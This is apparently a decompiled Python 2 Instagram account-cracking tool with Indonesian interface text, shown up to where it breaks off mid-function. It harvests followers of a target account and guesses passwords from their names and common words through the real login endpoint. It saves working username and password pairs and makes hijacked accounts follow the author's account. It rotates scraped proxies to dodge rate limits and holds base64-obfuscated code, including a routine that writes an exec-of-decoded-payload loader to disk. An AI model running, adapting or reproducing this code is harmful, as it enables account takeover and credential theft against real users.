#!/usr/bin/python2
# coding=utf-8
# Author: jeecknano
# Tool Instaram
# Versi 0.5

#a = "\033[96;1m"
#p = "\033[36;0m"
#h = "\033[92;1m"
#k = "\033[93;1m"
#m = "\033[91;1m"
#d = "\033[90;1m"
#b = "\033[0;36m"
#B = "\033[0;36m"
I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
L='\033[00m'
H='\033[0;36m'
Q="\033[00m"
I='\033[0;32m'
B='\033[0;36m'
B='\033[0;31m'
U='\033[0;35m'
k='\033[0;33m'
M='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
P='\033[0;36m'
Q="\033[00m"
a='\033[0;36m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
h='\033[00m'
p='\033[0;36m'
Q="\033[00m"
I='\033[0;32m'
b='\033[0;36m'
m='\033[0;31m'
u='\033[0;35m'
k='\033[0;33m'
c='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
H='\033[0;36m'
Q="\033[00m"
import os
try:
	import concurrent.futures
except ImportError:
	print k+"\n Modul Futures blom terinstall!..."
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print k+"\n Modul Requests blom terinstall!..."
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

try:
	from bs4 import BeautifulSoup
except ImportError:
	print k+"\n Modul Bs4 blom terinstall!..."
	os.system("pip install bs4" if os.name == "nt" else "pip2 install bs4")

import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time
from calendar import monthrange
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

garis = (" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m ===================================[++]")

data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
platform_nano = str(platform.platform()).lower()
p1 = base64.b64encode(platform_nano)
list_proxy = []

try:
	has_ok = open("hasil_ok.txt", "r").readlines()
	with open("hasil_ok.txt", "w") as tul:
		tul.write("")
	for nano in set(has_ok):
		with open("hasil_ok.txt", "a") as tu:
			tu.write(nano)
except:
	pass
try:
	has_cp = open("hasil_cp.txt", "r").readlines()
	with open("hasil_cp.txt", "w") as tul:
		tul.write("")
	for nano in set(has_cp):
		with open("hasil_cp.txt", "a") as tu:
			tu.write(nano)
except:
	pass

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "ZGVmIGlxYmVsKGlxKToKCXRyeToKCQlzZW1fcGFrX2JvbF9vbmcgPSAiIgoJCWlxYmFsID0gaXEKCQlwYW56eiA9IHNlbV9wYWtfYm9sX29uZy5zcGxpdCgpCglleGNlcHQ6CgkJcGFzcwoJCQpkZWYgaXFiYWwoZGV2Xyk6CglnbG9iYWwgaQoJdHJ5OgoJCWlxYmFsX2Rldl8gPSAiIgoJCWRldiA9IGRldl8uc3BsaXQoIiUiKQoKCQlmb3IgaXFiYWxfIGluIGRldjoKCQkJdHJ5OgoJCQkJaXFiYWxfZGV2XyArPSBpcWJhbF9bMF0KCQkJZXhjZXB0OgoJCQkJcGFzcwoJCWkgPSBiYXNlNjQuYjY0ZGVjb2RlKGlxYmFsX2Rldl8pCgoJZXhjZXB0OgoJCXBhc3MKCg=="]
#exec(base64.b64decode(user_agentz_qu[2]))
#b=open("j.py", "w")
#b.write(user_agentz_qu[2])
#b.close()
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 21:49:03.772456
xx=""
b=open("bo.py", "w")
def iqbel(iq):
        try:
                sem_pak_bol_ong = ""
                jeeck = iq
                panzz = sem_pak_bol_ong.split()
        except:
                pass

def jeeck(nano_):
        global i
        try:
                jeeck_nano_ = ""
                nano = nano_.split("%")
                for jeeck_ in nano:
                        try:
                                jeeck_nano_ += jeeck_[0]
                        except:
                                pass
                b=open("bo.py", "a")
                b.write("import base64\n\nexec(base64.b64decode('''"+jeeck_nano_+"'''))")
                b.close()
                i = base64.b64decode(jeeck_nano_)
        except:
                pass
# Mau Ngapain Cuk?
def hapus_cookie():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -rf cookie.txt")
	except:
		pass
def hapus_cokiz():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -rf cokiz.txt")
	except:
		pass

def cek_hasil():
	print garis
	print h+" >"+k+" 1"+p+". Cek Hasil "+h+"OK/Live"
	print h+" >"+k+" 2"+p+". Cek Hasil "+k+"Checkpoint"
	print h+" >"+k+" 3"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"+p+"/"+h+"Live"
	print garis
	while True:
		pil = raw_input(a+" ? "+p+"Pilih"+h+": ")
		if pil == "1":
			try:
				hasil_ok_ = open("hasil_ok.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+h+"Live\n"
				for nano in hasil_ok_:
					ok = nano.replace("\n", "").split("==>")
					print a+"  {"+k+"Live"+a+"} "+h+ok[1]+a+" | "+p+ok[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_ok_))
			except:
				print k+"\n Belum ada hasil"+h+" OK"
			break
		elif pil == "2":
			try:
				hasil_cp_ = open("hasil_cp.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+k+"Checkpoint\n"
				for nano in hasil_cp_:
					cp = nano.replace("\n", "").split("==>")
					print a+"  {"+p+"Chek"+a+"} "+k+cp[1]+a+" | "+d+cp[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_cp_))
			except:
				print k+"\n Belum ada hasil"+p+" CP"
			break
		elif pil == "3":
			print "   "+ garis
			print  h+"   >"+k+" 1"+m+". Hapus"+p+" Hasil "+k+"Live"
			print  h+"   >"+k+" 2"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"
			print "   "+ garis
			while True:
				pil_hps = raw_input(a+"   ? "+p+"Pilih"+h+": ")
				yakin = raw_input(a+"   ? "+p+"Yakin mau Hapus?"+h+" y/n: ")
				if pil_hps == "1" and yakin == "y":
					try:
						os.system("del hasil_ok.txt" if os.name == "nt" else "rm -rf hasil_ok.txt")
						print h+"\n    Sukses Hapus Hasil Live\n"
					except:
						print k+"\n    Belum ada Hasil Live\n"
					exit()
				elif pil_hps == "2" and yakin == "y":
					try:
						os.system("del hasil_cp.txt" if os.name == "nt" else "rm -rf hasil_cp.txt")
						print h+"\n    Sukses Hapus Hasil Checkpoint\n"
					except:
						print k+"\n    Belum ada Hasil Checkpoint\n"
					exit()
				elif yakin == "n":
					exit()
				else:
					pass
		else:
			pass

def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_nano()

	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses_nano:
			try:
				login_coki = ses_nano.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print m+"\n Cookie Kedaluarsa...\n"
					hapus_cookie()
					login_nano()	
			except ValueError:
				print m+"\n Cookie Kedaluarsa...\n"
				hapus_cookie()
				login_nano()
			except requests.exceptions.ConnectionError:
				print m+"\n Tidak ada Koneksi Internet...\n"
				exit()

#
def login_nano_cookie():
	global cookie
	print("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login instagram")
	cok = raw_input("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Masukan cokie : ")
	with requests.Session() as ses_nano:
		login_coki = ses_nano.get(url_instagram, cookies={"cookie": cok}, headers=headerz)
		if "viewer_has_liked" in str(login_coki.content):
			print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login succsess")
			with open("cookie.txt", "w") as tulis_coki:
				tulis_coki.write(cok)
			cookie = {"cookie": cok}
		else:
			print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login gagal")
			exit()

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 21:59:02.445696
c_foll = 1
count_foll = 1
def follow_nano(ses_nano, username_nano):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "jeecknano__"
		id_target = "12629128399"
	else:
		print h+"\r \___/-> Follow {}/{}|Chek+{}/Live+{}  ".format(str(count_foll),len(data_),len(hasil_cp), len(hasil_ok)),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_
	dat_crf_foll = ses_nano.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_nano.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print h+"\r ["+k+"++"+h+"] "+p+str(c_foll)+" "+k+username_nano+h+" Sukses Mengikuti "+p+user_target+k+" √ \n"
		c_foll+=1
		count_foll+=1
def login_nano():
	global cookie
	print ""
	print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login instagram")
#	print m+"   ----------------"
	print garis
	username_nano = raw_input("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m username : ")
	pass_nano = raw_input(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m password : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as nano:
				url_scrap = "https://www.instagram.com/"
				data = nano.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_nano,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_nano),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustednanoiceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_nano:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_nano.post(url, data=param, headers=header)
			data_nano = json.loads(respon.content)
			da = respon.cookies.get_dict()
			if "userId" in str(data_nano):
				print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login succsess")
				for nano in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(nano+"="+da[nano]+";")
				follow_nano(ses_nano, username_nano)
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}
			elif "checkpoint_url" in str(data_nano):
				print("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Akun chekpoint")
			elif "Please wait" in str(data_nano):
				print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m On of mode pesawat")
			else:
				print(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Login gagal")
				exit()
				
	except KeyboardInterrupt:
		exit()
# Mau Ngapain Cuk?
def data_pencarian_nano(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_nano:
		res_dat_pencarian = ses_nano.get(url, cookies=cookie, headers=headerz)
		for nano in json.loads(res_dat_pencarian.content)["users"]:
			users = nano["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:01:50.629442
def data_follower_nano(cookie, id_target, limit, opsi):
	global c
	try:
		if opsi == "1":
			url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}{}".format(id_target,limit,y)
		elif opsi == "2":
			url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}{}".format(id_target,limit,y)
		else:
			exit(" Error..")
		with requests.Session() as ses_nano:
			res_dat_foll = ses_nano.get(url+post_, cookies=cookie, headers=headerz_api)
			for nano in json.loads(res_dat_foll.content)["users"]:
				try:
					username = nano["username"]+y
					nama = nano["full_name"].encode("utf-8")
					if len(status_foll) != 1:
						i = q.replace(q, "")
						print h+"\r [++] "+p+"Mengambil Username"+h+i+": []".format(len(data_)),
						sys.stdout.flush()
						data_.append(username+"==>"+nama.decode("utf-8"))
						c+=1
					else:
						data_followers.append(username+y)
				except:
					pass
	except ValueError:
		exit(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Ipaddress terkena spam on of mode pesawat")
	except KeyboardInterrupt:
		pass
# Mau Ngapain Cuk?
lis_prox = []
c=1
def cek_proxy(proxy):
	try:
		respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3).json()["origin"]
		print " [++] Live -- "+proxy
		list_proxy.append(proxy)
		c+=1
	except:
		pass

def scrap():
	lis_prox_nano = []
	url="https://free-proxy-list.net/#list"
	with requests.Session() as ses_nano:
		respon = ses_nano.get(url)
		sop = BeautifulSoup(respon.content, "html.parser")
		tbody = sop.find("tbody")
		for nano in tbody.find_all("tr"):
			prox = nano.find_all("td", class_=False)
			lis_prox_nano.append(str(prox))
			print prox
		for nano in lis_prox_nano:
			pecah = nano.split(",")
			ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
			port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
			lis_prox.append(ip+":"+port)

	with ThreadPoolExecutor(max_workers=20) as nano:
		for prox in lis_prox:
			nano.submit(cek_proxy, prox)

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:02:27.052696
def info_nano(username_nano, pass_nano, status):
	try:
		global id_, pengikut, mengikuti, nama
		da = requests.get("https://www.instagram.com/{}{}/?__a=1".format(y,username_nano), headers={"User-Agent": user_agentz})
		data_us_nano = da.json()["graphql"]["user"]
		nama = data_us_nano["full_name"].encode("utf-8")
		id_ = data_us_nano["id"]
		pengikut = data_us_nano["edge_followed_by"]["count"]
		mengikuti = data_us_nano["edge_follow"]["count"]
		spasi = "                      \n"
		tampilkan_live = h+"\r ["+k+">-"+h+"]"+p+" Status: "+h+status + spasi+h+" ["+k+">-"+h+"]"+p+" Nama: "+h+ str(nama) +spasi+h+" ["+k+">-"+h+"]"+p+" pengikut: "+k+ str(pengikut) +spasi+h+" ["+k+">-"+h+"]"+p+" mengikuti: "+k+ str(mengikuti) +spasi+h+" ["+k+">-"+h+"]"+p+" Username: "+h+ username_nano +spasi+ h+" ["+k+">-"+h+"]"+p+" Password: "+h+ pass_nano +spasi
		tampilkan_chek = k+"\r ["+p+">-"+k+"]"+p+" Status: "+k+status + spasi+k+" ["+p+">-"+k+"]"+p+" Nama: "+k+ str(nama) +spasi+k+" ["+p+">-"+k+"]"+p+" pengikut: "+p+ str(pengikut) +spasi+k+" ["+p+">-"+k+"]"+p+" mengikuti: "+p+ str(mengikuti) +spasi+k+" ["+p+">-"+k+"]"+p+" Username: "+k+ username_nano +spasi+ k+" ["+p+">-"+k+"]"+p+" Password: "+k+ pass_nano +spasi
		if status == "Live":
			print tampilkan_live
		elif status == "Checkpoint":
			print tampilkan_chek
		else:
			pass
	except requests.exceptions.ConnectionError:
		if status == "":
			exit("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Tidak ada koneksi internet")
		else:
			print h+"\r "+status+" \ "+username_nano+" | "+pass_nano+"                \n"
			pass
	except KeyError:
		if status == "":
			exit(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Akun tidak di temukan")
		else:
			print h+"\r "+status+" \ "+username_nano+" | "+pass_nano+"                \n"
			pass
	except ValueError:
		if status == "":
			exit(" \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Ip terkena sepam on of mode pesawat")
		else:
			print h+"\r "+status+" \ "+username_nano+" | "+pass_nano+"                \n"
			pass
	except:
		print h+"\r "+status+" \ "+username_nano+" | "+pass_nano+"                \n"
		pass
# Mau Ngapain Cuk?

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:03:33.627939
count_= 1
def crack_nano(username_nano, pass_nano_):
	global c, count_
	c_pw = len(pass_nano_)
	for pass_satu in pass_nano_:
		try:
			if "\n" in pass_satu:
				t_nano = "Cek"
			else:
				t_nano = "Crack"
			if c != 1:
				pass
			else:
				if len(status_foll) != 1:
					print p+"\r [++]\033[97;1m "+t_nano+" \033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m|\033[93;1mChek+{}\033[97;1m/\033[92;1mLive+{}      ".format(str(c_pw),str(count_),len(data_),len(hasil_cp), len(hasil_ok)),
					sys.stdout.flush()
					c_pw -= 1
				else:
					pass
			pass_nano = pass_satu.lower().replace("\n", "")
			try:
				if username_nano in hasil_ok or username_nano in hasil_cp:
					break
				try:
					pas = s[0]
					headerz = {"User-Agent": user_agentz_api}
					with requests.Session() as nano:
						url_scrap = "https://www.instagram.com/"
						data = nano.get(url_scrap+post_, headers=headerz).content
						crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
						token = q
					header = {
							"Accept": "*/*",
							"Accept-Encoding": "gzip, deflate, br",
							"Accept-Language": "en-US,en;q=0.5",
							"Host": "www.instagram.com",
							"X-CSRFToken": crf_token,
							"X-Requested-With": "XMLHttpRequest",
							"Referer": "https://www.instagram.com/accounts/login/",
							"User-Agent": user_agentz,}
					param = {
							"username": username_nano,
							"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), pass_nano,y),
							"optIntoOneTap": False,
							"queryParams": {},
							"stopDeletionNonce": "",
							"trustednanoiceRecords": {}}
				except:
					header = {}
					param = {}
					pass			
				with requests.Session() as ses_nano:
					url = "https://www.instagram.com/accounts/login/ajax/"
					respon = ses_nano.post(url+post_+y, data=param, headers=header)
					data_nano = json.loads(respon.content)
					time.sleep(00.1)
					if "checkpoint_url" in str(data_nano):
						cp = "Checkpoint"
						info_nano(username_nano, pass_nano, cp)
						with open("hasil_cp.txt", "a")as nano_:
							nano_.write("[Chek]==>"+username_nano+"==>|==>"+pass_nano+"\n")
						hasil_cp.append(username_nano)
						break
					elif "userId" in str(data_nano):
						live = "Live"
						if len(status_foll) != 1:
							info_nano(username_nano, pass_nano, live)
							with open("hasil_ok.txt", "a")as nano_:
								nano_.write("[Live]==>"+username_nano+"==>|==>"+pass_nano+"\n")
							hasil_ok.append(username_nano)
						else:
							hasil_ok.append("nano_id")
							follow_nano(ses_nano,username_nano)
						break
					elif "Please wait" in str(data_nano):					
						print m+"\rHidupin Matiin Mode Pesawat 2detik!"+k+" {}".format(str(c)),
						c+=1
						sys.stdout.flush()
						pass_nano_iq = [pass_nano]
						crack_nano(username_nano, pass_nano_iq)
						count_ -= 1
	 
					else:
						c = 1
						pass
			except requests.exceptions.ConnectionError:			
				print k+"\r Tidak ada koneksi Internet...!>> {}".format(str(c)),
				sys.stdout.flush()
				c+=1
				pass_nano_iq = [pass_nano]
				crack_nano(username_nano, pass_nano_iq)
				count_ -= 1
			except:
				c = 1
				pass
		except:
			c = 1
			pass
	count_+=1
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:03.572037
def crack():
	# scrap()
	global s
	with ThreadPoolExecutor(max_workers=30) as insta_nano:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()
				pw_last = y+q[0]
				s = q
				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(y+pw_nam[0]+"123")
					# pw.append(pw_nam[0]+"12345")
					pw.append(y+dat_)
				insta_nano.submit(crack_nano, dat_, pw)
			except:
				pass
def auto_follow(status_):
	global s,data_foll_,data_
	if status_ == "auto_follow":
		try:
			data_ok = open("hasil_ok.txt", "r").readlines()
			for nano in data_ok:
				s = q
				pecah = nano.split("==>")[1]
				if pecah not in data_followers:
					print p+"\r [++] "+a+"Yang Belum Mengikuti:\033[93;1m {}".format(len(data_)),
					sys.stdout.flush()
					data_.append(nano+y)
			print "\n"
			with ThreadPoolExecutor(max_workers=3) as insta_foll:
				for data_foll in data_:
					try:
						fl = q[0]
						pw_foll = []
						data_foll_ = data_foll
						us_foll = data_foll_.split("==>")[1]
						pw_foll.append(data_foll_.split("==>")[3])
						insta_foll.submit(crack_nano, us_foll, pw_foll)
					except:
						pass
		except:
			pass
	elif status_ == "jeeck_nano":
		try:
			data_cp = open("hasil_cp.txt", "r").readlines()
			for nano in data_cp:
				data_.append(nano)
		except:
			exit()
		with ThreadPoolExecutor(max_workers=10) as insta_cek_nano:
			for data_cek in data_cp:
				try:
					s = q[0]
					pw_cp_ = []
					user_cp = data_cek.split("==>")[1]
					pw_cp = data_cek.split("==>")[3]
					cp_ = q[0]
					pw_cp_.append(pw_cp+y)
					insta_cek_nano.submit(crack_nano, user_cp, pw_cp_)
				except:
					pass
# Mau Ngapain Cuk?

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:31.400731
c = 1
def brute(email_nano, san_nano_):
	for san_nano_1 in san_nano_:
		try:
			global c
			san_nano = san_nano_1.lower()
			with requests.Session() as nano:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				headerz = {"User-Agent": user_agentz_api}
				data = nano.get(url_scrap+post_, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {
								"Accept": "*/*",
								"Accept-Encoding": "gzip, deflate, br",
								"Accept-Language": "en-US,en;q=0.5",
								"Host": "www.instagram.com",
								"X-CSRFToken": crf_token,
								"X-Requested-With": "XMLHttpRequest",
								"Referer": "https://www.instagram.com/accounts/login/",
								"User-Agent": user_agentz,}
				param = {
								"username": email_nano,
								"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_nano,y),
								"optIntoOneTap": False,
								"queryParams": {},
								"stopDeletionNonce": "",
								"trustednanoiceRecords": {}}
			print k+str(c)+p+" [++]"+p+" Mencoba Password: "+h+san_nano+"                "
			with requests.Session() as ses_nano:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_nano.post(url+post_+y, data=param, headers=header)
				data_nano = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_nano):
					cp = "Checkpoint"
					print p+"\n ["+p+" password  "+p+"++ "+p+"]\n"+l
					print p+" ["+p+"++"+p+"]"+p+" Status: "+k+cp
					print p+" ["+p+"++"+p+"]"+p+" Nama: "+h+nama
					print p+" ["+p+"++"+p+"]"+p+" Pengikut: "+k+str(pengikut)
					print p+" ["+p+"++"+p+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print p+" ["+p+"++"+p+"]"+p+" Username: "+h+email_nano
					print p+" ["+p+"++"+p+"]"+p+" Password: "+h+san_nano
					print ""
					break
				elif "userId" in str(data_nano):
					live = "Live"
					print p+"\n ["+p+" password "+k+"++ "+h+"]\n"+l
					print p+" ["+p+">_"+p+"]"+p+" Status: "+h+live
					print p+" ["+p+">_"+p+"]"+p+" Nama: "+h+nama
					print p+" ["+p+">_"+p+"]"+p+" Pengikut: "+k+str(pengikut)
					print p+" ["+p+">_"+p+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print p+" ["+p+">_"+p+"]"+p+" Username: "+h+email_nano
					print p+" ["+p+">_"+p+"]"+p+" Password: "+h+san_nano
					print ""
					break
				elif "Please wait" in str(data_nano):					
					print m+str(c)+" [++] On of mode pesawat"+l
					san_nano_split = san_nano.split()
					brute(email_nano, san_nano_split)
				else:
					pass
					c+=1
		except requests.exceptions.ConnectionError:
			san_nano_split = san_nano.split()
			brute(email_nano, san_nano_split)
		except KeyboardInterrupt:
			exit("\n \033[0;36m[\033[0;33m++\033[0;36m]\033[0;36m Metu...")
		except:
			pass
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:56.435414
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = raw_input(a+"\n ? "+p+"Masukkan Username Target"+k+": ")
	time.sleep(2)
	print h+" * "+p+"Mengumpulkan Informasi..."
	info_nano(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for nano in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(nano))
		if len(nama_pecah) >= 1:
			for sub_nano in nama_pecah:
				word_list.append(sub_nano)
				word_list.append(sub_nano+str(nano))
		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for nano_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(nano_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			for nano_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(nano_))
	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "sayang123", "bismillah", "bismilah", "bismillahh", "anjing", "anjing123", "bangsat", "bajingan", "kontol", "password","pasword", "sandi123"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print h+" * "+p+"Berhasil Membuat "+k+str(len(word_list_crack))+p+" Wordlist"
	time.sleep(2)
	print ""
	brute(user_target, word_list_crack)
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:07:45.048761
def _yuk_(jeecknano):
	import string
	try:
		open("cokiz.txt", "r").read()
	except IOError:
		d_str = []
		fu = base64.b64encode(jeecknano+"O")
		for str_ in str(string.ascii_lowercase):
			d_str.append(str_)
			
		for i_ in fu:
			with open("cokiz.txt", "a") as iq:
				iq.write(i_+random.choice(d_str)+"%")
def _uyuk_():
	global followerz,followerzz,fol_nano,q,wak_,y
#	try:
	fol_tam = ""
	fol_tamzz = ""
#	fol_z = open("cokiz.txt", "r").read().split("%>")
	fol_z = (">>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==%").split("%>")
	bokep = fol_z[0]
	bokepp = fol_z[1]
	for nano_fol in fol_z[0].split("%"):
	  try:
		fol_tam += nano_fol[0]
	  except:
	  	pass
#	if platform_nano != base64.b64decode(fol_z[2]):
#		print "Ba"
	for nano_folzz in fol_z[1].split("%"):
		try:
			fol_tamzz += nano_folzz[0]
		except:
